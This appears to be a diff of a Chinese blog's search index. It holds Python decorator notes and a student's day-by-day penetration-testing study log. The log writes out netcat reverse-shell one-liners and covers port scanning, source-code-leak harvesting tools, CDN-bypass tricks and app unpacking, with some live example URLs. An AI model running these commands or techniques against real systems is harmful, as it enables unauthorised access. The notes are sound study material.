class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;用户名或密码错误，请重新输入&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的订单&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的资料&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>
+
+<p>之后的相应是</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/装饰器应用.py</span><br><span class="line">请先登录</span><br><span class="line">还未完成用户登录操作</span><br><span class="line">请输入用户名：admin</span><br><span class="line">请输入密码：<span class="number">123456</span></span><br><span class="line">登录成功</span><br><span class="line">欢迎来到首页</span><br><span class="line">欢迎来到我的订单</span><br><span class="line">欢迎来到我的资料</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、Pickle和Json模块的总结"><a href="#三、Pickle和Json模块的总结" class="headerlink" title="三、Pickle和Json模块的总结"></a>三、Pickle和Json模块的总结</h1><p>Pickle是将对象（数据）转化为字节，json是将对象（数据）转化为json格式</p>
+<blockquote>
+<p>1、dumps    把对象（数据）转化为字节</p>
+<p>2、loads       把字节转化回对象（数据）</p>
+<p>3、dump      把对象序列化成字节之后写入到文件</p>
+<p>3、load         把文件中的字节反序列化成对象 </p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试学习之路</title>
+    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
+<span id="more"></span>
+
+<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
+<p>一些参考的资料工具网站</p>
+<p>渗透常见术语<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
+<p>渗透中下载：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
+<p>反弹shell：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
+<p>常见命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
+</blockquote>
+<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
+<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
+<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
+<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
+<p>Windows：nc -e cmd ip port</p>
+<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
+</blockquote>
+<p>内网可以连接外网，外网无法去连接内网。</p>
+<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
+<p>②将cmd权限发出，并使用外网主机接受</p>
+<p>③拿到权限，从而去完成渗透</p>
+<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
+<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
+<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
+<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
+<p>然后就是可以根据响应包的状态码去判断状态。</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
+<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
+<h1 id="第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用"><a href="#第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用" class="headerlink" title="第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用"></a>第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用</h1><h2 id="1、重点总结"><a href="#1、重点总结" class="headerlink" title="1、重点总结"></a>1、重点总结</h2><p>①为什么要抓包？ -抓包应用的资产信息进行安全测试</p>
+<p>②抓包的对象有哪些？ -小程序，APP，桌面应用等</p>
+<p>③抓包协议区别工具？ -有部分应用不走HTTP&#x2F;S，需要用到全局协议抓包</p>
+<p>④封包和抓包不同之处？  -零散整体的区别，封包能精确到每一个操作的数据包。</p>
+<h2 id="2、手机APP、小程序的抓包"><a href="#2、手机APP、小程序的抓包" class="headerlink" title="2、手机APP、小程序的抓包"></a>2、手机APP、小程序的抓包</h2><p>使用bp，Charles去抓包，小程序的话不方便使用bp，使用Charles更加方便。</p>
+<p>bp抓包能够精准定位到每一次数据包的发送。</p>
+<h2 id="3、全局协议抓包"><a href="#3、全局协议抓包" class="headerlink" title="3、全局协议抓包"></a>3、全局协议抓包</h2><p>可以去使用科来或者wireshark去抓包，直接对全局进行抓包，并不只局限于HTTP数据包，可以更方便的用于对一些应用的抓包。</p>
+<h2 id="4、封包"><a href="#4、封包" class="headerlink" title="4、封包"></a>4、封包</h2><p>这里就可以去使用一个封包监听工具，可以去监听某个进程的数据包并且进行封包，封包的话就是可以将某种行为包装成一个数据包，我们就可以重新去发送这个数据包去重复某种行为，更加精确。这就很方便于对于游戏外挂相关的制作。</p>
+<h1 id="第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值"></a>第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值</h1><p>今天讲的这个就是属于很基础的一部分了，都是相关加密解密的，作为一个ctf选手这方面了解的也算挺多的，所以也就不过多去讲解了。</p>
+<h2 id="1、文件加密"><a href="#1、文件加密" class="headerlink" title="1、文件加密"></a>1、文件加密</h2><p>通过各种语言自身的加密方式，对源代码进行加密，从而达到数据保护的功能。</p>
+<p>dll加密、php加密、SQL加密、jar加密</p>
+<h2 id="2、对编码的观察"><a href="#2、对编码的观察" class="headerlink" title="2、对编码的观察"></a>2、对编码的观察</h2><p>需要去熟悉一些加解密的相应特征，并且要求能够在碰见一些加密后的数据后能够去判断出加密方法并且对之进行解密。</p>
+<h1 id="第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡"><a href="#第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡" class="headerlink" title="第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡"></a>第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</h1><h2 id="1、CDN和负载均衡"><a href="#1、CDN和负载均衡" class="headerlink" title="1、CDN和负载均衡"></a>1、CDN和负载均衡</h2><p>CDN是购买结点，从而去达到工具服务器的作用，从而可以加速访问国外网站的作用，并且可以在被攻打时无法找到真正的网站服务器。</p>
+<p>负载均衡时自身使用多台服务器，在访问的时候去随机访问一台服务器，从而也能起到防止渗透的作用。</p>
+<h2 id="2、web安全问题"><a href="#2、web安全问题" class="headerlink" title="2、web安全问题"></a>2、web安全问题</h2><p>目录站点</p>
+<p>端口站点</p>
+<p>ip站点</p>
+<p>服务器站点</p>
+<p>站点插件</p>
+<h2 id="3、番外安全问题"><a href="#3、番外安全问题" class="headerlink" title="3、番外安全问题"></a>3、番外安全问题</h2><p>域名注册商</p>
+<p>服务器厂商</p>
+<p>管理人员安全</p>
+<h2 id="4、一些阻碍"><a href="#4、一些阻碍" class="headerlink" title="4、一些阻碍"></a>4、一些阻碍</h2><p>站库分离</p>
+<p>CDN加速服务</p>
+<p>负载均衡服务</p>
+<p>WAF应用防火墙</p>
+<p>主机防护防火墙</p>
+<h1 id="第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取"></a>第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取</h1><p>知识点：</p>
+<p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等</p>
+<p>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等</p>
+<p>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他</p>
+<p>4、打点-Web域名-子域名&amp;反查域名&amp;旁注等</p>
+<p>信息点：</p>
+<p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p>
+<p>技术点：</p>
+<p>CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等</p>
+<h1 id="第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份"></a>第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份</h1><p>知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p>
+<p>详细点：<br>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a><br>源码泄漏原因：<br>1、从源码本身的特性入口<br>2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p>
+<p>源码泄漏集合：<br>composer.]son<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.m1泄露<br>DS Store文件泄露<br>SWP文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏</p>
+<p>演示案例：<br>直接获取-CMS识别-云悉指纹识别平台<br>（yunsee.cn 在线指纹识别平台）<br>习惯不好备份文件-某黑阔博客源码泄漏<br>（网站管理员将网站备份到网站目录下造成源码泄露）<br>配置不当-GIT泄漏某程序员博客源码泄漏<br>参考链接：<a href="https://codeleading.com/article/54926468941/">https://codeleading.com/article/54926468941/</a><br>利用工具：<a href="https://github/lijiejie/GitHack">https://github/lijiejie/GitHack</a></p>
+<p>当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了<br>比如某个网站存在.git文件泄露，可以：<br>利用方式：<br>github上的githack可以把整个.git备份的文件下载下来。它能解析 .git&#x2F;index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git&#x2F;objects&#x2F; 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码<br>配置不当-SVN泄漏-某国外小伙子源码泄漏<br>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。<br>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留，因此攻击者可以使用工具 dvcs-ripper 下载网站源码。<br>当可以访问到&#x2F;.svn&#x2F;entries的时候，就证明存在了。<br>比如乌云曾经爆出的某个网站：</p>
+<p><a href="http://data.5i5j.com/sitemetrics/.svn/entries">http://data.5i5j.com/sitemetrics/.svn/entries</a><br>利用工具 <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>工具命令 rip-svn.pl -v -u <a href="http://www.localhost.test/.svn/">http://www.localhost.test/.svn/</a></p>
+<p>配置不当-DS Store泄漏-某开发Mac源码泄漏<br>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p>
+<p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。通过.DS_Store可以知道这个目录里所有的文件名称。</p>
+<p>当访问&#x2F;.ds_store可以访问的到，就证明存在。例如：</p>
+<p><a href="http://www.baidu.com/.ds_store">http://www.baidu.com/.ds_store</a></p>
+<p>工具:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
+<p>使用方式：</p>
+<p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p>
+<p>PHP特性-composer.json泄漏-某直接搭建源码泄漏</p>
+<p>例如：<a href="http://57.128.195.180/composer.json">http://57.128.195.180/composer.json</a></p>
+<blockquote>
+<p>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</p>
+<p>解题思路：访问靶场通过控制filename来任意文件下载</p>
+<p>因为WEB-INF会存储配置文件，所以构造filename&#x3D;WEB-INF&#x2F;web.xml,此文件会记录源码的结构</p>
+<p>访问文件内容，并构造文件名下载</p>
+<p>最后通过反编译出flag</p>
+</blockquote>
+<blockquote>
+<p>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工<br>通过github和google hack语法搜索相关信息<br>相关利用项目：</p>
+<p>cMs识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> 备份：敏感目录文件扫描 -7 kbscan-WebPathBrute<br>CVS:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>GIT:<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>SVN:<a href="https://github.com/callmefeifei/SvnHack_DS">https://github.com/callmefeifei/SvnHack_DS</a><br>Store:<a href="https://github.com/lijiejie/ds_stor_exp">https://github.com/lijiejie/ds_stor_exp</a></p>
+</blockquote>
+<blockquote>
+<p>GITHUB资源搜索：<br>in:name test #仓库标题搜索含有关键字<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字</p>
+</blockquote>
+<h1 id="第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙"></a>第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙</h1><p>知识点：<br>1、获取网络信息-服务厂商&amp;网络架构<br>2、获取服务信息-应用协议&amp;内网资产<br>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p>
+<p>详细点：<br>CDN服务，WAF防火墙，负载均衡，防火墙阻碍？</p>
+<p>演示案例：<br>网络信息获取-服务厂商&amp;网络架构<br>通过域名信息查询获取 IP、云服务厂商、域名出售厂商、注册者邮箱等信息（可以使用威胁情报平台）</p>
+<p>服务信息获取-协议应用&amp;内网资产<br>旁注：查询同一服务器下的不同WEB应用<br>C段：查询同一网段下，不同服务器部署的不同WEB应用<br>nmap target -Pn -osscan-limit -sV</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Pn：不检测主机存活 -osscan-limit:扫操作系统 </span><br><span class="line"></span><br><span class="line">-sV：探测打开的端口以确定服务/版本信息</span><br></pre></td></tr></table></figure>
+
+<p>阻碍信息获取-CDN&amp;WAF&amp;负载&amp;防火墙<br>超级ping:CDN服务识别（全国个地去ping目标地址，看访问的IP地址是否不同）<br>wafw00f识别waf、看图识别</p>
+<p>ldb识别负载均衡</p>
+<p>#相关利用项目：<br>Masscan:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><br>Wafwoof:<a href="https://github.com/Enablesecurity/wafw00f">https://github.com/Enablesecurity/wafw00f</a><br>Kali上自带Nmap,Masscan,lbd等项目，超级ping:ping.chinaz.com<br>超级ping:CDN服务识别<br>Masscan:端口扫描，应用协议<br>Wafw00f:Web应用防护防火墙识别<br>namp：端口扫描，应用协议，防火墙识别<br>lbd:负载均衡，广域网负载均衡，应用层负载均衡</p>
+<h1 id="第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件"><a href="#第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件" class="headerlink" title="第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件"></a>第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：</span><br><span class="line">1、CDN知识-工作原理及阻碍</span><br><span class="line">2、CDN配置-域名&amp;区域&amp;类型</span><br><span class="line">3、CDN绕过-靠谱十余种技战法</span><br><span class="line">4、CDN绑定-HOSTS绑定指向访问</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>CDN 是构建在数据网络上的一种分布式的内容分发网。 CDN的作用是采用流媒体服务器集群技术，克服单机系统输出带宽及并发能力不足的缺点，可极大提升系统支持的并发流数目，减少或避免单点失效带来的不良影响。</p>
+</blockquote>
+<p>#前置知识<br>1.传统访问：用户访问域名-&gt;解析服务器IP-&gt;访问目标主机<br>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机<br>3.带WAF的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p>
+<p>CDN的使用:在阿里云平台上去进行按每一步配置即可。</p>
+<p>#判定标准：<br>nslookup,各地ping(出现多个IP即启用CDN服务)<br>#参考知识：<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a><br>子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包<br>黑暗空间引擎（yofo），通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演示案例：</span><br><span class="line">真实应用-CDN绕过-漏洞&amp;遗留文件</span><br><span class="line">原理： 利用ssrf使得服务器主动请求VPS地址，此时通过在VPS地址监听请求即可得知真实地址。（相当于目标服务器主动请求VPS地址，vps会监听到真实地址）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-子域名查询操作</span><br><span class="line">原理：配置CDN时管理员考虑费用问题可能会将子域名排除在外，此时通过手机子域名信息即可得到真实地址（用于子域名应用和根域名应用部署在同一服务器的情况下）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-接口查询国外访问</span><br><span class="line">原理：配置CDN时选择地域可能会仅设置成国内生效，此时使用国外地址访问获得真实地址</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-主动邮件配合备案</span><br><span class="line">原理:通过系统功能（如：密码找回发送邮件，查看邮件发送方地址找寻），通过备案信息确认，一般是通过备案的地点去判定</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-全网扫描FuckCDN</span><br><span class="line">原理：扫描全球ip匹配web内容，实用工具匹配扫描网段title信息。需要大量时间很多情况下，不过也是最稳定的方法。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#参考知识：</span><br><span class="line">https://zhuanlan.zhihu.com/p/33440472</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/5771827.html</span><br><span class="line">子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包</span><br><span class="line">黑暗空间引擎，通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</span><br><span class="line">#案例资源：</span><br><span class="line">超级Ping:https://www.17ce.com/</span><br><span class="line">接口查询：https://get-site-ip.com/</span><br><span class="line">国外请求：https://tools.ipip.net/cdn.php</span><br><span class="line">全网扫描：https://github.com/Tai7sy/fuckcdn</span><br></pre></td></tr></table></figure>
+
+<h1 id="第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取"></a>第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 知识点：</span><br><span class="line"></span><br><span class="line">1、小程序-外在-资产收集</span><br><span class="line">2、APP-外在&amp;内在-资产收集</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 演示案例：</span><br><span class="line"></span><br><span class="line">APP-外在抓包-Fd&amp;茶杯&amp;Burp</span><br><span class="line"></span><br><span class="line">APP-外在封包-封包监听工具</span><br><span class="line">使用封包监听也可抓到数据包</span><br></pre></td></tr></table></figure>
+
+<p>APP-内在提取-ApplnfoScanner</p>
+<blockquote>
+<p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p>
+</blockquote>
+<p>APP-内在搜索-反编译载入IDEA</p>
+<ul>
+<li>APP-资源提取-安装泡&amp;资源文件<br>使用安卓修改大师导入apk文件，可对域名资源进行收集</li>
+</ul>
+<p>​	还可使用IDEA对反编译出的项目进行资源收集</p>
+<ul>
+<li>APP-框架使用-Xposed&amp;JustTrustMe</li>
+</ul>
+<p>某些apk存在加壳的情况，会扫描失败，可以通过工具判断apk是否加壳</p>
+<p>可通过安装xp框架的方式进行脱壳处理</p>
+<p>小程序-微信-电脑版登录启动抓包分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APP安卓入手</span><br><span class="line">1、外在-抓包封包-资产安全测试</span><br><span class="line">资产收集-资源提取-ICO,MD5,HASH-黑暗引擎搜索相关资产</span><br><span class="line">2、外在-功能逻辑</span><br><span class="line">3、内在-反编译-JAVA代码代码审计</span><br><span class="line">4、内在-反编译-提取RES资源-黑暗资产收集</span><br></pre></td></tr></table></figure>
+
+<h1 id="第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔"><a href="#第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔" class="headerlink" title="第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔"></a>第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔</h1><p>知识点：<br>1、网络空间四大引擎-Fofa&amp;Quake&amp;shodan&amp;2 oomeye I<br>2、自动化信息收集项目-ARL灯塔&amp;Suize水泽s Kunyui坤舆<br>3、单点功能信息收集项目-企查：子域名指纹识别：社工信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##黑暗引擎：</span><br><span class="line">https://fofa.so</span><br><span class="line">https://quake.360.cn</span><br><span class="line">https://www.shodan.io</span><br><span class="line">https://www.zoomeye.org</span><br><span class="line">##自动项目：</span><br><span class="line">https://github.com/knownsec/Kunyu</span><br><span class="line">https://github.com/0x727/shuize 0x727</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">##相关资源：</span><br><span class="line">https://forum.ywhack.com/center.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、演示案例：网络空间-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye</span><br><span class="line">工具测评网络空间四大黑暗彩擎集合版项目</span><br><span class="line">finger:通过调用zoomeyes和fofa的接口实现</span><br><span class="line">	通过fofa和zoomeyes两个接口去进行信息搜集</span><br><span class="line">2工具测评-自动化收集-ARL灯塔&amp;Suize水泽&amp;Kunyu</span><br><span class="line">Kunyu：通过调用zoomeyes API实现资产信息和漏洞信息收集 还能够通过一个api去进行相关漏洞的搜集</span><br><span class="line">ARL灯塔：自动化信息收集工具</span><br><span class="line">水泽Suize：认为是暂时最好用的一个工具，能够搜集到更加全面的信息。</span><br><span class="line">3、工具测评-单点功能器企查查&amp;子域名&amp;指纹识别&amp;社工</span><br><span class="line">相比自动化全部搜集的工具，所能搜集到的信息更加准确，但都是同一个方面的。</span><br><span class="line">上述工具都可以在菱角社区去找到。</span><br></pre></td></tr></table></figure>
+
+<h1 id="第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受"><a href="#第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受" class="headerlink" title="第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受"></a>第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受</h1><p>首先ctf中注意的是php中的单双引号的区别，单引号不解析变量，双引号能够解析变量</p>
+<p>知识点：<br>1、PHP入门-语法&amp;提交等<br>2、MsQL入门-数据库操作<br>3、HTML+CS5入门-样式编排</p>
+<p>演示案例：<br>小迪博客文章阅读功能初步实现</p>
+<p>实现功能：<br>前端文章导航，点入内容显示，更改I♪显示不同内容<br>实现步骤：<br>1、前端页面显示编写-HTML&amp;CSS<br>HTML 是一种用于创建网页的标记语言，全称为超文本标记语言。使用html构造显示前端文章导航站点。</p>
